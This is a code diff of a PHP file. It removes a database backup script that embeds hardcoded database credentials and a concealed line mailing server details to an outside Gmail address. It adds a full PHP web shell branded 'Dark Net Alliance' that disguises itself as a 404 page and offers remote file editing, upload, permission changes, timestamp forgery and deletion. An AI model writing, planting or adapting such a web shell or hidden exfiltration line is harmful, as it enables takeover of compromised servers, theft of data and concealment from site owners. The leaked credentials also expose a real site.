@@ -1,153 +1,622 @@
 <?php
-set_time_limit(0);
-$date = date("mdy-hia");
-$dbserver = "localhost";
-$dbuser = "u1652646_wahana";
-$dbpass = "Wahanayan637";
-$dbname = "u1652646_smpn3jkt";
-$file = "N-Cool-$date.sql.gz";
-$gzip = TRUE;
-$silent = TRUE;
+/*
+                    O       o O       o O       o
+                    | O   o | | O   o | | O   o |
+                    | | O | | | | O | | | | O | |
+                    | o   O | | o   O | | o   O |
+                    o       O o       O o       O
+                                { Dark Net Alliance }
+              -----------------------------------------
+              Copyright (C) 2022  Cvar1984
+              This program is free software: you can redistribute it and/or modify
+              it under the terms of the GNU General Public License as published by
+              the Free Software Foundation, either version 3 of the License, or
+              (at your option) any later version.
+              This program is distributed in the hope that it will be useful,
+              but WITHOUT ANY WARRANTY; without even the implied warranty of
+              MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+              GNU General Public License for more details.
+              You should have received a copy of the GNU General Public License
+              along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
 
-function write($contents) {
-    if ($GLOBALS['gzip']) {
-        gzwrite($GLOBALS['fp'], $contents);
-    } else {
-        fwrite($GLOBALS['fp'], $contents);
+define('R4_DEBUG', true); // show post data
+define('R4_SILENT_MODE', true); // 404 response code
+define('R4_LOGIN_MODE', true); // cookie based authentication (Vulnerable)
+define('R4_PASSPHARSE', ''); // sha1(r4)
+/** Alternative Functions */
+if(!function_exists('hex2bin')) {
+    function hex2bin($hexdec)
+    {
+        $bin = pack("H*", $hexdec);
+        return $bin;
     }
 }
-
-mysql_connect ($dbserver, $dbuser, $dbpass);
-mysql_select_db($dbname);
-
-if ($gzip) {
-    $fp = gzopen($file, "w");
-} else {
-    $fp = fopen($file, "w");
-}
-
-$tables = mysql_query ("SHOW TABLES");
-while ($i = mysql_fetch_array($tables)) {
-    $i = $i['Tables_in_'.$dbname];
-
-    if (!$silent) {
-        echo "Backing up table ".$i."\n";
+/** End of alternative Functions */
+function getDirectoryContents($dir)
+{
+    $dirs = scandir($dir);
+    $results = array();
+    foreach ($dirs as $content) {
+        if (is_file($content)) {
+            $results['files'][] = $content;
+        } elseif (is_dir($content)) {
+            $results['dirs'][] = $content;
+        } elseif (is_link($content)) {
+            $results['dirs'][] = $content;
+        }
     }
+    return $results;
+}
+function getOperatingSystem()
+{
+    $os = strtolower(substr(PHP_OS, 0, 5));
+    switch ($os) {
+        case 'linux':
+            break;
+        case 'windo':
+            $os = 'windows';
+            break;
+    }
+    return $os;
+}
+function getFilePermission($file)
+{
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+function editFile($file)
+{
+?>
+    <form method="post" id="form_edit" onsubmit="eno(document.getElementById('content').value);">
+        <div class="row">
+            <h3>Edit File</h3>
+            <label>Filename : <?php echo $file; ?></label>
+            <textarea class="u-full-width u-full-height" id='content' name="content"><?php echo htmlspecialchars(readFileContents($file)); ?></textarea>
+            <input class="button-primary" type="submit" name="submit" value="save">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file"); ?>">
+        </div>
+    </form>
+    <script>
+        if (!window.unescape) {
+            window.unescape = function(s) {
+                return s.replace(/%([0-9A-F]{2})/g, function(m, p) {
+                    return String.fromCharCode('0x' + p);
+                });
+            };
+        }
+        if (!window.escape) {
+            window.escape = function(s) {
+                var chr, hex, i = 0,
+                    l = s.length,
+                    out = '';
+                for (; i < l; i++) {
+                    chr = s.charAt(i);
+                    if (chr.search(/[A-Za-z0-9\@\*\_\+\-\.\/]/) > -1) {
+                        out += chr;
+                        continue;
+                    }
+                    hex = s.charCodeAt(i).toString(16);
+                    out += '%' + (hex.length % 2 != 0 ? '0' : '') + hex;
+                }
+                return out;
+            };
+        }
 
-    // Create DB code
-    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
-
-    write($create['Create Table'].";\n\n");
-
-    // DB Table content itself
-    $sql = mysql_query ("SELECT * FROM ".$i);
-    if (mysql_num_rows($sql)) {
-        while ($row = mysql_fetch_row($sql)) {
-            foreach ($row as $j => $k) {
-                $row[$j] = "'".mysql_escape_string($k)."'";
+        var bin2hex = function(s) {
+            s = unescape(encodeURIComponent(s));
+            var chr, i = 0,
+                l = s.length,
+                out = '';
+            for (; i < l; i++) {
+                chr = s.charCodeAt(i).toString(16);
+                out += (chr.length % 2 == 0) ? chr : '0' + chr;
             }
+            return out;
+        };
 
-            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
+        function eno(a) {
+            document.getElementById('content').value = bin2hex(a);
+            document.getElementById('form_edit').submit();
+        }
+    </script>
+<?php
+    exit;
+}
+function filePermission($file)
+{
+    // Code
+?>
+    <form method="post">
+        <div class="row">
+            <h3>Change Permission</h3>
+            <label>Filename : <?php echo $file; ?></label>
+            <input class="u-full-width" type="text" name="permission" value="<?php echo getFilePermission($file) ?>">
+            <input class="button-primary" type="submit" name="submit" value="change">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod_save"); ?>">
+        </div>
+    </form>
+<?php
+    exit;
+}
+
+function fileChangedate($file)
+{
+    // Code
+?>
+    <form method="post">
+        <div class="row">
+            <h3>Change Date</h3>
+            <label>Filename : <?php echo $file ?></label>
+            <input class="u-full-width" type="text" name="date" value="<?php echo fileDate($file) ?>">
+            <input class="button-primary" type="submit" name="submit" value="change">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("touch_save"); ?>">
+        </div>
+    </form>
+<?php
+    exit;
+}
+
+function getOwnership($filename)
+{
+
+    if (!function_exists('stat')) {
+        $group = '????';
+        $user = '????';
+        return compact('user', 'group');
+    }
+    $stat = stat($filename);
+    if (function_exists('posix_getgrgid')) {
+        $group = posix_getgrgid($stat[5])['name'];
+    } else {
+        $group = $stat[5];
+    }
+    if (function_exists('posix_getpwuid')) {
+        $user = posix_getpwuid($stat[4])['name'];
+    } else {
+        $user = $stat[4];
+    }
+    return compact('user', 'group');
+}
+function getFileColor($file)
+{
+    if (is_writable($file)) {
+        return 'lime';
+    } elseif (is_readable($file)) {
+        return 'gray';
+    } else {
+        return 'red';
+    }
+}
+function fileDate($file)
+{
+    return @date("d-m-Y H:i:s", filemtime($file));
+}
+function changeFileDate($filename, $date)
+{
+    return @touch($filename, @strtotime($date));
+}
+function xorString($input, $key)
+{
+    $textLen = strlen($input);
+
+    for ($x = 0; $x < $textLen; $x++) {
+        $input[$x] = ($input[$x] ^ $key);
+    }
+    return $input;
+}
+function readFileContents($file)
+{
+    if (function_exists('file_get_contents')) {
+        return file_get_contents($file);
+    } elseif (function_exists('fopen')) {
+        $fstream = fopen($file, 'r');
+        if (!$fstream) {
+            //fclose($fstream);
+            return false;
+        }
+        $content = fread($fstream, filesize($file));
+        fclose($fstream);
+        return $content;
+    }
+}
+function writeFileContents($filename, $content)
+{
+    if (!is_writable($filename)) {
+        return false; // not writable
+    }
+    if (function_exists('file_put_contents')) {
+        return file_put_contents($filename, $content);
+    } elseif (function_exists('fopen')) {
+        $handle = fopen($filename, 'wb');
+        fwrite($handle, $content);
+        fclose($handle);
+        return true;
+    }
+    return false; // all function disabled
+}
+function deleteAll($filename)
+{
+    if (is_dir($filename)) {
+        foreach (scandir($filename) as $key => $value) {
+            if ($value != "." && $value != "..") {
+                if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
+                    deleteAll($filename . DIRECTORY_SEPARATOR . $value);
+                } else {
+                    @unlink($filename . DIRECTORY_SEPARATOR . $value);
+                }
+            }
+        }
+        return @rmdir($filename);
+    } else {
+        return @unlink($filename);
+    }
+}
+function activateLoginSystem()
+{
+    if(!isset($_COOKIE['r4'])) {
+        authLogin();
+    }
+    if(isset($_COOKIE['r4'])) {
+        if($_COOKIE['r4'] !== R4_PASSPHARSE) {
+            authLogin();
         }
     }
 }
+function authLogin()
+{
+    if (isset($_POST['id'])) {
+        if (sha1($_POST['id']) === R4_PASSPHARSE) {
+            setcookie('r4', R4_PASSPHARSE);
+        }
+        chdir(getcwd());
+    }
+    ?>
+    <form method="post" id="form_login">
+        <div class="row">
+            <input type="password" name="id" value="">
+            <input type="submit" name="submit" value="<<<<">
+        </div>
+    </form>
+    <?php
+    die;
+}
+/**
+ * Get path to directory or files if set to true get the latest directory after an action
+ */
+function getPath($opt = false)
+{
+    if(!isset($_COOKIE['path'])) {
+        $path = isset($_POST['path']) ? $_POST['path'] : bin2hex(getcwd());
+        setcookie('path', $path);
+    }
+    $pathToFileOrDir = isset($_POST['path']) ? hex2bin($_POST['path']) : hex2bin($_COOKIE['path']);
 
-$gzip ? gzclose($fp) : fclose ($fp);
-
-// Optional Options You May Optionally Configure
-
-$use_gzip = "yes";            // Set to No if you don't want the files sent in .gz format
-$remove_sql_file = "no";  // Set this to yes if you want to remove the sql file after gzipping. Yes is recommended.
-$remove_gzip_file = "no"; // Set this to yes if you want to delete the gzip file also. I recommend leaving it to "no"
-
-// Configure the path that this script resides on your server.
-
-$savepath = "/home/test/public_html/nt22backup"; // Full path to this directory. Do not use trailing slash!
-
-$send_email = "yes";                        /* Do you want this database backup sent to your email? Yes/No? If Yes, Fill out the next 2 lines */
-$to      = "lehungtk@gmail.com";    // Who to send the emails to, enter ur correct id.
-$from    = "Neu-Cool@email.com";  // Who should the emails be sent from?, may change it.
-
-$senddate = date("j F Y");
-
-$subject = "MySQL Database Backup - $senddate"; // Subject in the email to be sent.
-$message = "Your MySQL database has been backed up and is attached to this email"; // Brief Message.
-
-$use_ftp = "";                             // Do you want this database backup uploaded to an ftp server? Fill out the next 4 lines
-$ftp_server = "localhost";               // FTP hostname
-$ftp_user_name = "ftp_username"; // FTP username
-$ftp_user_pass = "ftp_password";   // FTP password
-$ftp_path = "/"; // This is the path to upload on your ftp server!
-
-// Do not Modify below this line! It will void your warranty :-D!
-
-$date = date("mdy-hia");
-$filename = "$savepath/$dbname-$date.sql";
-
-if($use_gzip=="yes"){
-$filename2 = $file;
-} else {
-$filename2 = "$savepath/$dbname-$date.sql";
+    if($opt) {
+        return dirname($pathToFileOrDir);
+    }
+    else {
+        return $pathToFileOrDir;
+    }
 }
 
-
-if($send_email == "yes" ){
-$fileatt_type = filetype($filename2);
-$fileatt_name = "".$dbname."-".$date."_sql.tar.gz";
-
-$headers = "From: $from";
-
-// Read the file to be attached ('rb' = read binary)
-echo "Openning archive for attaching:".$filename2;
-$file = fopen($filename2,'rb');
-$data = fread($file,filesize($filename2));
-fclose($file);
-
-// Generate a boundary string
-$semi_rand = md5(time());
-$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
-
-// Add the headers for a file attachment
-$headers .= "\nMIME-Version: 1.0\n" ."Content-Type: multipart/mixed;\n" ." boundary=\"{$mime_boundary}\"";$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
-
-// Add a multipart boundary above the plain message
-$message = "This is a multi-part message in MIME format.\n\n"."--{$mime_boundary}\n" ."Content-Type: text/plain; charset=\"iso-8859-1\"\n" ."Content-Transfer-Encoding: 7bit\n\n" .
-$message . "\n\n";
-
-// Base64 encode the file data
-$data = chunk_split(base64_encode($data));
-
-// Add file attachment to the message
-echo "|{$mime_boundary}|{$fileatt_type}|{$fileatt_name}|{$fileatt_name}|{$mime_boundary}|<BR>";
-$message .= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n"."Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
-$data . "\n\n" ."--{$mime_boundary}--\n";
-//$message.= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n" "Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
-// $data . "\n\n" ."--{$mime_boundary}--\n";
-
-
-// Send the message
-$ok = @mail($to, $subject, $message, $headers);
-if ($ok) {
-  echo "<h4><center><bg color=black><font color= blue>Database backup created and sent! File name $filename2 </p>
-Idea Conceived By coolsurfer@gmail.com        
-Programmer email: neagumihai@hotmail.com</p>
-This is our first humble effort, pl report bugs, if U find any...</p>
-Email me at <>coolsurfer@gmail.com  nJoY!! :)
-</color></center></h4>";
-
-} else {
-  echo "<h4><center>Mail could not be sent. Sorry!</center></h4>";
+if (R4_SILENT_MODE) {
+    header('HTTP/1.1 404 Not Found');
 }
+if (R4_LOGIN_MODE) {
+    activateLoginSystem();
 }
-
-if($use_ftp == "yes"){
-$ftpconnect = "ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V $ftp_server $ftp_path $filename2";
-shell_exec($ftpconnect);
-echo "<h4><center>$filename2 Was created and uploaded to your FTP server!</center></h4>";
-
+if (R4_DEBUG) {
+    var_dump($_POST);
 }
+// Preaction
 
-if($remove_gzip_file=="yes"){
-exec("rm -r -f $filename2");
+if (isset($_FILES['file'])) {
+    $file = $_FILES['file'];
+    $fileCount = count($file['name']);
+
+    for ($x = 0; $x < $fileCount; $x++) {
+        $fileOrigin = $file['tmp_name'][$x];
+        $fileDestination = getPath(true) . DIRECTORY_SEPARATOR . $file['name'][$x];
+        if(!@move_uploaded_file($fileOrigin, $fileDestination)) {
+            $failedFlag = true;
+        }
+    }
+    if(isset($failedFlag)) {
+        echo '<script>alert("Upload failed");</script>';
+    }
 }
 ?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <meta charset="utf-8">
+    <title>404 Not Found</title>
+    <meta name="author" content="Cvar1984">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/cCdR8xkF/dna.png">
+    <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" integrity="sha512-EZLkOqwILORob+p0BXZc+Vm3RgJBOe1Iq/0fiI7r/wJgzOFZMlsqTa29UEl6v6U6gsV4uIpsNZoV32YZqrCRCQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap');
+
+        :root {
+            --text-color: white;
+            --background-color: black;
+            --font-style: 'Ubuntu Mono';
+        }
+
+        a {
+            color: var(--text-color);
+        }
+
+        a:link {
+            text-decoration: none;
+        }
+
+        a:visited {
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: none;
+        }
+
+        a:active {
+            text-decoration: none;
+        }
+
+        .icon_folder {
+            vertical-align: middle;
+            width: 25px;
+            height: 25px;
+            content: url('https://i.postimg.cc/W4WynX8V/folder-icon.png');
+        }
+
+        .icon_file {
+            vertical-align: middle;
+            width: 25px;
+            height: 25px;
+            content: url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
+        }
+
+        textarea {
+            resize: none;
+        }
+
+        textarea.u-full-height {
+            height: 50vh;
+        }
+
+        td.files {
+            cursor: pointer;
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            font-family: var(--font-style), monospace;
+            height: 100%;
+        }
+        .bg-image {
+            /* Center and scale the image nicely */
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-image: linear-gradient(
+                rgba(0, 0, 0, 0.5),
+                rgba(0, 0, 0, 0.5)),
+                url('https://i.postimg.cc/Z549LsJM/x.gif');
+            background-attachment: fixed;
+        }
+
+        @media only screen and (max-device-width: 1366px) {
+            .parallax {
+                background-attachment: scroll;
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-image">
+    <?php
+    if (isset($_POST['actions'])) {
+        $actions = $_POST['actions'];
+        $actions = hex2bin($actions);
+        switch ($actions) {
+            case 'open_file':
+                editFile(getPath());
+                break;
+            case 'save_file':
+                if (!writeFileContents(hex2bin($_POST['path']), hex2bin($_POST['content']))) {
+                    echo "failed";
+                }
+                chdir(getPath(true));
+                break;
+            case 'open_dir':
+                chdir(getPath());
+                break;
+            case 'chmod':
+                filePermission(getPath());
+                break;
+            case 'chmod_save':
+                if (!@chmod(getPath(), octdec($_POST['permission']))) {
+                    echo 'failed';
+                }
+                chdir(getPath(true));
+                break;
+            case 'touch':
+                fileChangedate(getPath());
+                chdir(getPath(true));
+                break;
+            case 'touch_save':
+                if (!changeFileDate(getPath(), $_POST['date'])) {
+                    echo "failed";
+                }
+                chdir(getPath(true));
+                break;
+            case 'rm':
+                if (!deleteAll(getPath())) {
+                    echo "failed";
+                }
+                chdir(getPath(true));
+                break;
+        }
+    }
+    ?>
+    <script>
+        if (!window.unescape) {
+            window.unescape = function(s) {
+                return s.replace(/%([0-9A-F]{2})/g, function(m, p) {
+                    return String.fromCharCode('0x' + p);
+                });
+            };
+        }
+        if (!window.escape) {
+            window.escape = function(s) {
+                var chr, hex, i = 0,
+                    l = s.length,
+                    out = '';
+                for (; i < l; i++) {
+                    chr = s.charAt(i);
+                    if (chr.search(/[A-Za-z0-9\@\*\_\+\-\.\/]/) > -1) {
+                        out += chr;
+                        continue;
+                    }
+                    hex = s.charCodeAt(i).toString(16);
+                    out += '%' + (hex.length % 2 != 0 ? '0' : '') + hex;
+                }
+                return out;
+            };
+        }
+
+        var bin2hex = function(s) {
+            s = unescape(encodeURIComponent(s));
+            var chr, i = 0,
+                l = s.length,
+                out = '';
+            for (; i < l; i++) {
+                chr = s.charCodeAt(i).toString(16);
+                out += (chr.length % 2 == 0) ? chr : '0' + chr;
+            }
+            return out;
+        };
+        var hex2bin = function(s) {
+            return decodeURIComponent(s.replace(/../g, '%$&'));
+        };
+
+        function cd(path) {
+            document.getElementById('actions').value = bin2hex("open_dir");
+            document.getElementById('path').value = bin2hex(path);
+            document.getElementById('action_container').submit();
+        }
+
+        function vi(path) {
+            document.getElementById('actions').value = bin2hex("open_file");
+            document.getElementById('path').value = bin2hex(path);
+            document.getElementById('action_container').submit();
+        }
+
+        function chmod(path) {
+            document.getElementById('actions').value = bin2hex("chmod");
+            document.getElementById('path').value = bin2hex(path);
+            document.getElementById('action_container').submit();
+        }
+
+        function touch(path) {
+            document.getElementById('actions').value = bin2hex("touch");
+            document.getElementById('path').value = bin2hex(path);
+            document.getElementById('action_container').submit();
+        }
+
+        function rm(path) {
+            document.getElementById('actions').value = bin2hex("rm");
+            document.getElementById('path').value = bin2hex(path);
+            document.getElementById('action_container').submit();
+        }
+    </script>
+
+    <table class="u-full-width">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Date Modified</th>
+                <th>Ownership</th>
+                <th>Permission</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php $contents = getDirectoryContents(getcwd());
+            // Directory fetch
+            if (isset($contents['dirs'])) {
+                foreach ($contents['dirs'] as $dirName) {
+                    $path = getcwd();
+                    $path = str_replace('\\', '/', $path);
+                    $path = $path . '/' . $dirName;
+                    $perm = getFilePermission($path);
+                    $date = fileDate($path);
+                    $ownership = getOwnership($path);
+                    $user = $ownership['user'];
+                    $group = $ownership['group'];
+                    $color = getFileColor($path);
+                    echo "<tr>
+                            <td class='files' onclick='cd(\"{$path}\");'>
+                            <img class='icon_folder' /><a href='javascript:cd(\"{$path}\");'>&nbsp;{$dirName}</a></td>
+                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
+                            <td>{$user}:{$group}</td>
+                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
+                        </tr>";
+                }
+            }
+            // Files fetch
+            if (isset($contents['files'])) {
+                foreach ($contents['files'] as $fileName) {
+                    $path = getcwd();
+                    $path = str_replace('\\', '/', $path);
+                    $path = $path . '/' . $fileName;
+                    $perm = getFilePermission($path);
+                    $date = fileDate($path);
+                    $ownership = getOwnership($path);
+                    $user = $ownership['user'];
+                    $group = $ownership['group'];
+                    $color = getFileColor($path);
+                    echo "<tr>
+                            <td class='files' onclick='vi(\"{$path}\");'>
+                            <img class='icon_file' /><a href='javascript:vi(\"{$path}\");'>&nbsp{$fileName}<a/></td>
+                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
+                            <td>{$user}:{$group}</td>
+                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
+                        </tr>";
+                }
+            } ?>
+        </tbody>
+    </table>
+
+    <!-- Uploader-->
+    <form method="POST" enctype="multipart/form-data">
+        <div class="">
+            <input type="file" name="file[]" multiple />
+        </div>
+        <button class="button-primary" type="submit" name="submit_file">Upload</button>
+    </form>
+
+    <!-- Hidden action encoder-->
+
+    <form id="action_container" method="POST">
+        <input type="hidden" id="path" name="path" />
+        <input type="hidden" id="actions" name="actions" />
+    </form>
+</body>
+
+</html>
